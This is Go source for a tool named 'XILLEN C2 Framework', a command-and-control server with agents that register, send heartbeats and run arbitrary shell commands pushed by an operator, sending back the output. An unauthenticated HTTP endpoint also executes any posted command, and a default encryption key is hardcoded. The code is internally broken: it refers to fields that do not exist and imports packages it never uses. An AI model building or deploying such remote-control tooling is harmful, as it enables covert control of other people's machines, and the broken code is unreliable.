package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

type Agent struct {
	ID          string    `json:"id"`
	Hostname    string    `json:"hostname"`
	IP          string    `json:"ip"`
	OS          string    `json:"os"`
	Arch        string    `json:"arch"`
	FirstSeen   time.Time `json:"first_seen"`
	LastSeen    time.Time `json:"last_seen"`
	Status      string    `json:"status"`
	Tasks       []Task    `json:"tasks"`
	Encryption  string    `json:"encryption"`
	Key         []byte    `json:"-"`
}

type Task struct {
	ID          string    `json:"id"`
	Type        string    `json:"type"`
	Command     string    `json:"command"`
	Status      string    `json:"status"`
	Result      string    `json:"result"`
	CreatedAt   time.Time `json:"created_at"`
	CompletedAt time.Time `json:"completed_at"`
}

type C2Server struct {
	agents     map[string]*Agent
	agentsMux  sync.RWMutex
	listener   net.Listener
	httpServer *http.Server
	config     *Config
}

type Config struct {
	Port           int    `json:"port"`
	HTTPPort       int    `json:"http_port"`
	EncryptionKey  string `json:"encryption_key"`
	UseTLS         bool   `json:"use_tls"`
	CertFile       string `json:"cert_file"`
	KeyFile        string `json:"key_file"`
	AgentTimeout   int    `json:"agent_timeout"`
	MaxAgents      int    `json:"max_agents"`
}

type Message struct {
	Type      string          `json:"type"`
	AgentID   string          `json:"agent_id"`
	Data      json.RawMessage `json:"data"`
	Timestamp time.Time       `json:"timestamp"`
	Signature string          `json:"signature"`
}

type CommandRequest struct {
	Command string `json:"command"`
	Args    []string `json:"args"`
}

type CommandResponse struct {
	Output string `json:"output"`
	Error  string `json:"error"`
	Code   int    `json:"code"`
}

func main() {
	var configFile string
	var serverMode bool
	var agentMode bool
	
	flag.StringVar(&configFile, "config", "config.json", "Configuration file path")
	flag.BoolVar(&serverMode, "server", false, "Run in server mode")
	flag.BoolVar(&agentMode, "agent", false, "Run in agent mode")
	flag.Parse()
	
	if serverMode {
		runServer(configFile)
	} else if agentMode {
		runAgent(configFile)
	} else {
		fmt.Println("XILLEN C2 Framework")
		fmt.Println("Usage:")
		fmt.Println("  --server: Run C2 server")
		fmt.Println("  --agent:  Run agent")
		fmt.Println("  --config: Configuration file path")
	}
}

func runServer(configFile string) {
	config, err := loadConfig(configFile)
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}
	
	server := &C2Server{
		agents: make(map[string]*Agent),
		config: config,
	}
	
	log.Printf("Starting XILLEN C2 Server on port %d", config.Port)
	
	if config.UseTLS {
		server.startTLSServer()
	} else {
		server.startTCPServer()
	}
	
	server.startHTTPServer()
	
	select {}
}

func runAgent(configFile string) {
	config, err := loadConfig(configFile)
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}
	
	agent := &Agent{
		ID:        generateAgentID(),
		Hostname:  getHostname(),
		IP:        getLocalIP(),
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		FirstSeen: time.Now(),
		LastSeen:  time.Now(),
		Status:    "active",
		Tasks:     []Task{},
		Encryption: "aes",
		Key:       []byte(config.EncryptionKey),
	}
	
	log.Printf("Starting XILLEN Agent: %s", agent.ID)
	
	agent.connectToServer(config)
}

func (s *C2Server) startTCPServer() {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", s.config.Port))
	if err != nil {
		log.Fatalf("Failed to start TCP server: %v", err)
	}
	s.listener = listener
	
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("Failed to accept connection: %v", err)
				continue
			}
			go s.handleConnection(conn)
		}
	}()
}

func (s *C2Server) startTLSServer() {
	cert, err := tls.LoadX509KeyPair(s.config.CertFile, s.config.KeyFile)
	if err != nil {
		log.Fatalf("Failed to load TLS certificate: %v", err)
	}
	
	config := &tls.Config{
		Certificates: []tls.Certificate{cert},
	}
	
	listener, err := tls.Listen("tcp", fmt.Sprintf(":%d", s.config.Port), config)
	if err != nil {
		log.Fatalf("Failed to start TLS server: %v", err)
	}
	s.listener = listener
	
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("Failed to accept TLS connection: %v", err)
				continue
			}
			go s.handleConnection(conn)
		}
	}()
}

func (s *C2Server) startHTTPServer() {
	mux := http.NewServeMux()
	
	mux.HandleFunc("/agents", s.handleAgentsEndpoint)
	mux.HandleFunc("/tasks", s.handleTasksEndpoint)
	mux.HandleFunc("/command", s.handleCommandEndpoint)
	mux.HandleFunc("/status", s.handleStatusEndpoint)
	
	s.httpServer = &http.Server{
		Addr:    fmt.Sprintf(":%d", s.config.HTTPPort),
		Handler: mux,
	}
	
	go func() {
		log.Printf("Starting HTTP server on port %d", s.config.HTTPPort)
		if err := s.httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("HTTP server error: %v", err)
		}
	}()
}

func (s *C2Server) handleConnection(conn net.Conn) {
	defer conn.Close()
	
	reader := bufio.NewReader(conn)
	
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				log.Printf("Error reading from connection: %v", err)
			}
			break
		}
		
		message = strings.TrimSpace(message)
		if message == "" {
			continue
		}
		
		var msg Message
		if err := json.Unmarshal([]byte(message), &msg); err != nil {
			log.Printf("Failed to unmarshal message: %v", err)
			continue
		}
		
		s.processMessage(conn, msg)
	}
}

func (s *C2Server) processMessage(conn net.Conn, msg Message) {
	switch msg.Type {
	case "register":
		s.handleAgentRegistration(conn, msg)
	case "heartbeat":
		s.handleHeartbeat(msg)
	case "task_result":
		s.handleTaskResult(msg)
	case "command_request":
		s.handleCommandRequest(conn, msg)
	default:
		log.Printf("Unknown message type: %s", msg.Type)
	}
}

func (s *C2Server) handleAgentRegistration(conn net.Conn, msg Message) {
	var agentData Agent
	if err := json.Unmarshal(msg.Data, &agentData); err != nil {
		log.Printf("Failed to unmarshal agent data: %v", err)
		return
	}
	
	s.agentsMux.Lock()
	defer s.agentsMux.Unlock()
	
	if len(s.agents) >= s.config.MaxAgents {
		log.Printf("Maximum agents limit reached")
		return
	}
	
	agentData.IP = conn.RemoteAddr().String()
	agentData.FirstSeen = time.Now()
	agentData.LastSeen = time.Now()
	agentData.Status = "active"
	
	s.agents[agentData.ID] = &agentData
	
	log.Printf("Agent registered: %s (%s)", agentData.ID, agentData.Hostname)
	
	response := Message{
		Type:      "register_response",
		AgentID:   agentData.ID,
		Timestamp: time.Now(),
	}
	
	responseData, _ := json.Marshal(response)
	conn.Write(append(responseData, '\n'))
}

func (s *C2Server) handleHeartbeat(msg Message) {
	s.agentsMux.Lock()
	defer s.agentsMux.Unlock()
	
	if agent, exists := s.agents[msg.AgentID]; exists {
		agent.LastSeen = time.Now()
		agent.Status = "active"
	}
}

func (s *C2Server) handleTaskResult(msg Message) {
	var taskResult Task
	if err := json.Unmarshal(msg.Data, &taskResult); err != nil {
		log.Printf("Failed to unmarshal task result: %v", err)
		return
	}
	
	s.agentsMux.Lock()
	defer s.agentsMux.Unlock()
	
	if agent, exists := s.agents[msg.AgentID]; exists {
		for i, task := range agent.Tasks {
			if task.ID == taskResult.ID {
				agent.Tasks[i] = taskResult
				log.Printf("Task completed: %s -> %s", taskResult.ID, taskResult.Status)
				break
			}
		}
	}
}

func (s *C2Server) handleCommandRequest(conn net.Conn, msg Message) {
	var cmdReq CommandRequest
	if err := json.Unmarshal(msg.Data, &cmdReq); err != nil {
		log.Printf("Failed to unmarshal command request: %v", err)
		return
	}
	
	output, err := exec.Command(cmdReq.Command, cmdReq.Args...).CombinedOutput()
	
	response := CommandResponse{
		Output: string(output),
		Code:   0,
	}
	
	if err != nil {
		response.Error = err.Error()
		response.Code = 1
	}
	
	responseData, _ := json.Marshal(response)
	responseMsg := Message{
		Type:      "command_response",
		AgentID:   msg.AgentID,
		Data:      responseData,
		Timestamp: time.Now(),
	}
	
	responseMsgData, _ := json.Marshal(responseMsg)
	conn.Write(append(responseMsgData, '\n'))
}

func (s *C2Server) handleAgentsEndpoint(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	s.agentsMux.RLock()
	defer s.agentsMux.RUnlock()
	
	agents := make([]*Agent, 0, len(s.agents))
	for _, agent := range s.agents {
		agents = append(agents, agent)
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agents)
}

func (s *C2Server) handleTasksEndpoint(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var task Task
	if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
		http.Error(w, "Invalid task data", http.StatusBadRequest)
		return
	}
	
	task.ID = generateTaskID()
	task.Status = "pending"
	task.CreatedAt = time.Now()
	
	s.agentsMux.Lock()
	defer s.agentsMux.Unlock()
	
	if agent, exists := s.agents[task.AgentID]; exists {
		agent.Tasks = append(agent.Tasks, task)
		log.Printf("Task created: %s for agent %s", task.ID, task.AgentID)
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(task)
}

func (s *C2Server) handleCommandEndpoint(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var cmdReq CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
		http.Error(w, "Invalid command data", http.StatusBadRequest)
		return
	}
	
	output, err := exec.Command(cmdReq.Command, cmdReq.Args...).CombinedOutput()
	
	response := CommandResponse{
		Output: string(output),
		Code:   0,
	}
	
	if err != nil {
		response.Error = err.Error()
		response.Code = 1
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

func (s *C2Server) handleStatusEndpoint(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	s.agentsMux.RLock()
	defer s.agentsMux.RUnlock()
	
	status := map[string]interface{}{
		"total_agents":    len(s.agents),
		"active_agents":   0,
		"inactive_agents": 0,
		"uptime":         time.Since(s.startTime).String(),
		"version":        "1.0.0",
	}
	
	for _, agent := range s.agents {
		if agent.Status == "active" {
			status["active_agents"] = status["active_agents"].(int) + 1
		} else {
			status["inactive_agents"] = status["inactive_agents"].(int) + 1
		}
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(status)
}

func (a *Agent) connectToServer(config *Config) {
	serverAddr := fmt.Sprintf("localhost:%d", config.Port)
	
	for {
		conn, err := net.Dial("tcp", serverAddr)
		if err != nil {
			log.Printf("Failed to connect to server: %v", err)
			time.Sleep(30 * time.Second)
			continue
		}
		
		log.Printf("Connected to server: %s", serverAddr)
		
		go a.handleServerConnection(conn)
		
		time.Sleep(60 * time.Second)
	}
}

func (a *Agent) handleServerConnection(conn net.Conn) {
	defer conn.Close()
	
	registerMsg := Message{
		Type:      "register",
		AgentID:   a.ID,
		Data:      a.marshalAgentData(),
		Timestamp: time.Now(),
	}
	
	registerData, _ := json.Marshal(registerMsg)
	conn.Write(append(registerData, '\n'))
	
	reader := bufio.NewReader(conn)
	
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				log.Printf("Error reading from server: %v", err)
			}
			break
		}
		
		message = strings.TrimSpace(message)
		if message == "" {
			continue
		}
		
		var msg Message
		if err := json.Unmarshal([]byte(message), &msg); err != nil {
			log.Printf("Failed to unmarshal server message: %v", err)
			continue
		}
		
		a.processServerMessage(conn, msg)
	}
}

func (a *Agent) processServerMessage(conn net.Conn, msg Message) {
	switch msg.Type {
	case "register_response":
		log.Printf("Registration successful")
	case "command_request":
		a.handleCommandRequest(conn, msg)
	case "task_request":
		a.handleTaskRequest(conn, msg)
	default:
		log.Printf("Unknown server message type: %s", msg.Type)
	}
}

func (a *Agent) handleCommandRequest(conn net.Conn, msg Message) {
	var cmdReq CommandRequest
	if err := json.Unmarshal(msg.Data, &cmdReq); err != nil {
		log.Printf("Failed to unmarshal command request: %v", err)
		return
	}
	
	log.Printf("Executing command: %s %v", cmdReq.Command, cmdReq.Args)
	
	output, err := exec.Command(cmdReq.Command, cmdReq.Args...).CombinedOutput()
	
	response := CommandResponse{
		Output: string(output),
		Code:   0,
	}
	
	if err != nil {
		response.Error = err.Error()
		response.Code = 1
	}
	
	responseData, _ := json.Marshal(response)
	responseMsg := Message{
		Type:      "command_response",
		AgentID:   a.ID,
		Data:      responseData,
		Timestamp: time.Now(),
	}
	
	responseMsgData, _ := json.Marshal(responseMsg)
	conn.Write(append(responseMsgData, '\n'))
}

func (a *Agent) handleTaskRequest(conn net.Conn, msg Message) {
	var task Task
	if err := json.Unmarshal(msg.Data, &task); err != nil {
		log.Printf("Failed to unmarshal task request: %v", err)
		return
	}
	
	log.Printf("Executing task: %s", task.ID)
	
	task.Status = "running"
	task.CreatedAt = time.Now()
	
	var result string
	var err error
	
	switch task.Type {
	case "shell":
		cmd := exec.Command("cmd", "/c", task.Command)
		if runtime.GOOS != "windows" {
			cmd = exec.Command("sh", "-c", task.Command)
		}
		output, cmdErr := cmd.CombinedOutput()
		result = string(output)
		err = cmdErr
	case "download":
		result = "Download functionality not implemented"
	case "upload":
		result = "Upload functionality not implemented"
	default:
		result = "Unknown task type"
	}
	
	if err != nil {
		task.Status = "failed"
		task.Result = fmt.Sprintf("Error: %v\nOutput: %s", err, result)
	} else {
		task.Status = "completed"
		task.Result = result
	}
	
	task.CompletedAt = time.Now()
	
	taskResultMsg := Message{
		Type:      "task_result",
		AgentID:   a.ID,
		Data:      a.marshalTaskData(task),
		Timestamp: time.Now(),
	}
	
	taskResultData, _ := json.Marshal(taskResultMsg)
	conn.Write(append(taskResultData, '\n'))
}

func (a *Agent) marshalAgentData() json.RawMessage {
	data, _ := json.Marshal(a)
	return data
}

func (a *Agent) marshalTaskData(task Task) json.RawMessage {
	data, _ := json.Marshal(task)
	return data
}

func (a *Agent) sendHeartbeat(conn net.Conn) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	
	for range ticker.C {
		heartbeatMsg := Message{
			Type:      "heartbeat",
			AgentID:   a.ID,
			Timestamp: time.Now(),
		}
		
		heartbeatData, _ := json.Marshal(heartbeatMsg)
		conn.Write(append(heartbeatData, '\n'))
	}
}

func loadConfig(filename string) (*Config, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	
	var config Config
	if err := json.NewDecoder(file).Decode(&config); err != nil {
		return nil, err
	}
	
	if config.Port == 0 {
		config.Port = 8443
	}
	if config.HTTPPort == 0 {
		config.HTTPPort = 8080
	}
	if config.EncryptionKey == "" {
		config.EncryptionKey = "default-encryption-key-32-bytes-long"
	}
	if config.AgentTimeout == 0 {
		config.AgentTimeout = 300
	}
	if config.MaxAgents == 0 {
		config.MaxAgents = 1000
	}
	
	return &config, nil
}

func generateAgentID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func generateTaskID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	
	return "unknown"
}
